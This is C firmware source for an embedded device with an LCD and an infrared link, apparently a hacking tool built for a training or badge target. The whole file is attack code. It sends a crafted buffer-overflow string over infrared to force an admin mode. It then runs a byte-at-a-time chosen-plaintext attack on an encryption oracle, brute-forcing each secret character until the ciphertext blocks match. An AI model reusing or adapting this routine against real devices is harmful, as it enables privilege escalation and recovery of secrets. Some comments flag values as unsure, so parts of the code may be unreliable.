//#include <stdint.h>
//#include <stdlib.h>  // For atoi function
//#include "definitions.h"  // SYS function prototypes
//#include "lcd_menu.h"
//#include "time.h"

#include "aes_hack.h"
#include "lcd_menu.h"
#include "ir.h"
#include "config/default/peripheral/port/plib_port.h"
#include "util.h"


// Calculate the total length of the combined string
#define TOTAL_LENGTH (sizeof(digits) - 1 + sizeof(lowercase) - 1 + sizeof(uppercase) - 1 + sizeof(punctuation) - 1)
// Define the combined string
const char digits[] = "0123456789";
const char lowercase[] = "abcdefghijklmnopqrstuvwxyz";
const char uppercase[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const char punctuation[] = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

char library[TOTAL_LENGTH + 1];
char waiting[] = "Hacking... /";
uint8_t u8_errorCounter = 0;
volatile bool b_aes_Hack_request = false; //TODO volatile needed?

void AES_HACK() {
    aes_hack_state_t state = FIND_TARGET;
    uint8_t indexOfBlock = 0;
    uint8_t spinnerIndex = 0;

    int lookup_table[] = {
        0, // 0 -> 0
        32, // 1 -> 32  
        64, // 2 -> 31  //TODO what should this value and below be?
        64, // 3 -> 48
        64, // 4 -> 64
        64 // 5 -> 95
    };
    uint8_t TargetEncryptedBlock[33];
    uint8_t characersToHack = 1;
    char dataWeKnow[64] = {0};
    char findTargetData[64] = {0};
    static char hackedCharacters[64] = {'R', 'e', 'c', 'o', 'v', 'e', 'r', 'e', 'd', ':', ' ', ' ', ' ', ' ', ' ', ' ', 'a', 'b', 'c'};
    uint8_t idx = 16;
    uint8_t hackIndex = 0;
    
    u8_errorCounter = 0;


    //build library
    strcpy(library, digits);
    strcat(library, lowercase);
    strcat(library, uppercase);
    strcat(library, punctuation);

    //Update LCD
    LCD_MENU_BufferToDisplayText(waiting, strlen(waiting), MENU_MODE_RESULTS); //print to display
    //DRV_ST7735_Update();
    Legato_Tasks();

    //TODO send OVER FLOW ATTACK step 1.  Assume target has has UART hacked. Get target to initial state. BETTER WAY TO SYNC???
    IR_SendMessage("\n", 1, NULL);
    SYSTICK_DelayMs(1000);
    IR_SendMessage("\n", 1, NULL);
    SYSTICK_DelayMs(1000);
    
    //Set Default
    memset(hackedCharacters, 0x00, sizeof(hackedCharacters));
    strcpy(hackedCharacters, "Recovered:         ");

    while (true) {
        ir_packet.valid_packet = false;
        memset(ir_packet.buffer, 0x00, sizeof (ir_packet.buffer)); //Clear buffer to protect null string terminators
        if(!IR_SendMessage("1", 5, "password")) //Password Menu to force device to receive input
        {
            strcpy(hackedCharacters, "Communication   Error           Press Back");
            LCD_MENU_BufferToDisplayText(hackedCharacters, strlen(hackedCharacters), MENU_MODE_RESULTS);
            return;            
        }
        else
        {
            break;
        }
    }
   
    SYSTICK_DelayMs(50);
    if(!IR_SendMessage("<<<<<O<V<E<R<<F<L<O<W<<H<A<C<K>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<11", 1, NULL)) //Cause Buffer Overflow to ensure admin mode
    {
        strcpy(hackedCharacters, "Communication   Error           Press Back");
        LCD_MENU_BufferToDisplayText(hackedCharacters, strlen(hackedCharacters), MENU_MODE_RESULTS);
        return;        
    }


    SYSTICK_DelayMs(200);

    //    //Step 2. Send B command
    //    Send_B();
    //
    //    //Step 3. Send single character to get response in order to determine how many characters we must hack
    //    Send_A("a");

    if (AES_HACK_PlainTextAttack("a") == false) {
        strcpy(hackedCharacters, "Communication   Error           Press Back");
        LCD_MENU_BufferToDisplayText(hackedCharacters, strlen(hackedCharacters), MENU_MODE_RESULTS);
        return;
    }

    //Step 4. Calculate how many characters we need to hack
    characersToHack = (((ir_packet.length -7) >> 1) - 2) - 0; //example... receive 32 bytes back.... need to hack 31

    //Step 5. Initialize our hack sequence
    for (uint8_t i = 0; i < (characersToHack); i++) //example... should give us 31 a's
    {
        dataWeKnow[i] = 'a';
        findTargetData[i] = 'a';
    }

    indexOfBlock = AES_HACK_FindTargetsBlock(dataWeKnow);
    hackIndex = strlen(dataWeKnow);

    while (characersToHack != 0) {


        //Now we go into a state machine and loop until characersToHack = 0 or hack effort exhausted
        switch (state) {
            case FIND_TARGET:
                //                Send_B();
                //                Send_A(findTargetData);
                if (AES_HACK_PlainTextAttack(findTargetData) == false) {
                    strcpy(hackedCharacters, "Communication   Error           Press Back");
                    LCD_MENU_BufferToDisplayText(hackedCharacters, strlen(hackedCharacters), MENU_MODE_RESULTS);
                    return;
                }
                //Below here ir_packet.valid == true
                memset(TargetEncryptedBlock, 0x00, sizeof (TargetEncryptedBlock));
                memcpy(TargetEncryptedBlock, &ir_packet.buffer[lookup_table[indexOfBlock] + 7], 32);
                printf("\nTarget: %s\n", TargetEncryptedBlock);
                //print_hex_string(TargetEncryptedBlock,16);
                //Below here ir_packet.valid == true
                state = BRUTE_FORCE;
                break;

            case BRUTE_FORCE:
                for (uint8_t i = 0; i < strlen(library); i++) {

                    //if (i % 10 == 0) {
                    //bufferToDisplayText(&spinner[spinnerIndex], 1, MENU_MODE_RESULTS); //print to display
                    //resultsSubMenu[0].displayText = &spinner[spinnerIndex];
                    //bufferToDisplayText(hackedCharacters, strlen(hackedCharacters), MENU_MODE_RESULTS); //print to display

                    switch (waiting[11]) {

                        case '\\':
                            waiting[11] = '|';
                            break;
                        case '|':
                            waiting[11] = '/';
                            break;
                        case '/':
                            waiting[11] = '-';
                            break;
                        case '-':
                            waiting[11] = '\\';
                            break;
                        default:
                            waiting[11] = '|';
                            break;
                    }

                    Legato_Tasks();
                    spinnerIndex += 2;
                    if (spinnerIndex > 4) {
                        spinnerIndex = 0;
                    }

                    //build data to test
                    dataWeKnow[hackIndex] = library[i];
                    printf("Trying: %s\n", dataWeKnow);
                    //                    Send_B();
                    //                    Send_A(dataWeKnow);
                    if (AES_HACK_PlainTextAttack(dataWeKnow) == false) {
                        strcpy(hackedCharacters, "Communication   Error           Press Back");
                        LCD_MENU_BufferToDisplayText(hackedCharacters, strlen(hackedCharacters), MENU_MODE_RESULTS);
                        return;
                    }

                    //Below here ir_packet.valid == true
                    //                    printf("\nCmp: ");
                    //                    printf(" %s", TargetEncryptedBlock);
                    //                    printf("  ");
                    //                    printf("%.32s\n", &ir_packet.buffer[lookup_table[indexOfBlock]]);
                    //print_array(&ir_packet.buffer[lookup_table[indexOfBlock]], 16);
                    //                    printf("\n");
                    if (memcmp(TargetEncryptedBlock, &ir_packet.buffer[lookup_table[indexOfBlock] + 7], 32) == 0) {
                        //match
                        printf("Hack!\n");
                        characersToHack = characersToHack - 1;
                        hackedCharacters[idx++] = library[i];
                        if (characersToHack == 0) {
                            state = FINISHED;
                        } else {
                            state = SET_PAD_ATTACK;
                            break;
                        }
                    }
                }
                if (state == BRUTE_FORCE) //No state change occurred which means nothing was recovered
                {
                    state = FINISHED;
                }
                break;

            case SET_PAD_ATTACK:
                UTIL_ShiftLeft((unsigned char*)dataWeKnow, sizeof (dataWeKnow) / sizeof (dataWeKnow[0]));
                findTargetData[strlen(findTargetData) - 1] = 0x00;
                state = FIND_TARGET;
                break;
            case FINISHED:
                printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                printf("Hack Exhausted. Recovered: %s\n", hackedCharacters);
                printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                //strcat(library, hackedCharacters);
                LCD_MENU_BufferToDisplayText(hackedCharacters, strlen(hackedCharacters), MENU_MODE_RESULTS); //print to display
                characersToHack = 0; // Force exit while loop
                ir_packet.valid_packet = false; //Reset receive state
                break;
        }
    }
}

uint8_t AES_HACK_FindTargetsBlock(char *input_string) {
    uint8_t counter = 16;
    uint8_t block = 0;
    while (strlen(input_string) >= counter) {
        counter = counter + 16;
        block = block + 1;
    }
    return block;
}

void AES_HACK_Start(void) {
    b_aes_Hack_request = true;
}

bool AES_HACK_PlainTextAttack(const char *plainText) {
    uint8_t u8_errorCounter = 0;
    bool isSuccess = true;
    while(u8_errorCounter < 5)
    {
        isSuccess = IR_SendMessage("b", 5, "backup");
        if(!isSuccess){
            return false;
        }
        
        isSuccess = IR_SendMessage(plainText, 1, "Cipher"); 
        if(!isSuccess){
            u8_errorCounter++;
        }
        else{
            return true;
        }
    }
    return false;
}
